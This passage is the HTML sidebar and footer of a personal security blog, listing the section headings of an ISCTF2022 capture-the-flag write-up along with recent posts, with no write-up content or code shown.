alt="avatar"/></div><div class="author-info__name">C4skg</div><div class="author-info__description">Sidere mens eadem mutato<br>繁星纵变，智慧永恒</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C4skg"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有问题请发邮件至 C4skg@qq.com</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eazy-onlineshell"><span class="toc-number">1.1.1.</span> <span class="toc-text">eazy-onlineshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#crazy-onlineshell"><span class="toc-number">1.1.2.</span> <span class="toc-text">crazy-onlineshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EASY-PHP01"><span class="toc-number">1.1.3.</span> <span class="toc-text">EASY-PHP01:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EASY-PHP02"><span class="toc-number">1.1.4.</span> <span class="toc-text">EASY-PHP02</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FakeWeb"><span class="toc-number">1.1.5.</span> <span class="toc-text">FakeWeb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#simplephp"><span class="toc-number">1.1.6.</span> <span class="toc-text">simplephp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#curl"><span class="toc-number">1.1.7.</span> <span class="toc-text">curl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rce%EF%BC%9F"><span class="toc-number">1.1.8.</span> <span class="toc-text">rce？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8C%AB%E5%92%8C%E8%80%81%E9%BC%A0"><span class="toc-number">1.1.9.</span> <span class="toc-text">猫和老鼠</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86%E5%A4%A7%E5%B8%88"><span class="toc-number">1.2.1.</span> <span class="toc-text">磁盘管理大师</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E6%AE%8B%E5%85%9A%E7%A6%8F%E5%88%A9"><span class="toc-number">1.2.2.</span> <span class="toc-text">手残党福利</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#give-your-color-cc"><span class="toc-number">1.2.3.</span> <span class="toc-text">give_your_color_cc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Welcome-To-ISCTF2022"><span class="toc-number">1.2.4.</span> <span class="toc-text">Welcome To ISCTF2022</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KFC%E7%96%AF%E7%8B%82%E6%98%9F%E6%9C%9F%E5%9B%9B"><span class="toc-number">1.2.5.</span> <span class="toc-text">KFC疯狂星期四</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%A4%BE%E5%B7%A5"><span class="toc-number">1.2.6.</span> <span class="toc-text">简单社工</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E7%88%B1%E7%9A%84emoji"><span class="toc-number">1.2.7.</span> <span class="toc-text">可爱的emoji</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%81%E8%89%B2%E6%89%B9%E4%BA%86%E5%A5%A5"><span class="toc-number">1.2.8.</span> <span class="toc-text">老色批了奥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8D%95%E9%A3%8E%E7%9A%84%E9%AD%94%E5%A5%B3"><span class="toc-number">1.2.9.</span> <span class="toc-text">捕风的魔女</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E8%93%9D%E9%B2%A8%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.2.10.</span> <span class="toc-text">小蓝鲨的秘密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse"><span class="toc-number">1.3.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SigninReverse"><span class="toc-number">1.3.1.</span> <span class="toc-text">SigninReverse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezbase"><span class="toc-number">1.3.2.</span> <span class="toc-text">ezbase</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%A4%E5%9D%A4%E7%9A%84csgo%E9%82%80%E8%AF%B7"><span class="toc-number">1.3.3.</span> <span class="toc-text">坤坤的csgo邀请</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#base64"><span class="toc-number">1.3.4.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E6%91%86re"><span class="toc-number">1.3.5.</span> <span class="toc-text">开摆re</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%E5%8F%A4%E5%85%B8%E7%8E%A9%E6%84%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">这是什么古典玩意</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezcry"><span class="toc-number">1.4.2.</span> <span class="toc-text">ezcry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezRSA"><span class="toc-number">1.4.3.</span> <span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%93%9D%E9%B2%A8%E5%AF%86%E7%A0%81"><span class="toc-number">1.4.4.</span> <span class="toc-text">蓝鲨密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%92%A6-%E8%BF%99%E4%B8%AA%E5%AF%86%E7%A0%81-%E6%80%8E%E4%B9%88%E6%80%AA%E6%80%AA%E7%9A%84"><span class="toc-number">1.4.5.</span> <span class="toc-text">咦 这个密码 怎么怪怪的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%9C%E5%91%9C%E5%91%9C%E6%88%91%E7%9A%84md5%E8%84%8F%E4%BA%86"><span class="toc-number">1.4.6.</span> <span class="toc-text">呜呜呜我的md5脏了</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/C4skg/d33e7953.html" title="NSSCTF RoundNSS#13 - flask?jwt?正确姿势">NSSCTF RoundNSS#13 - flask?jwt?正确姿势</a><time datetime="2023-06-04T09:17:02.000Z" title="发表于 2023-06-04 17:17:02">2023-06-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/C4skg/4fd9b10f.html" title="2023年第三届陕西省大学生网络安全技能大赛">2023年第三届陕西省大学生网络安全技能大赛</a><time datetime="2023-06-03T09:49:31.000Z" title="发表于 2023-06-03 17:49:31">2023-06-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/C4skg/34bb0543.html" title="2023LitCTF-WP">2023LitCTF-WP</a><time datetime="2023-05-15T14:53:05.000Z" title="发表于 2023-05-15 22:53:05">2023-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/C4skg/7e326139.html" title="网页渲染md美化指南">网页渲染md美化指南</a><time datetime="2023-02-02T12:21:35.000Z" title="发表于 2023-02-02 20:21:35">2023-02-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/C4skg/201698b1.html" title="博主GitHub开源项目推荐">博主GitHub开源项目推荐</a><time datetime="2023-02-02T11:46:26.000Z" title="发表于 2023-02-02 19:46:26">2023-02-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By C4skg</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn"><span>浙ICP备2022018709号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
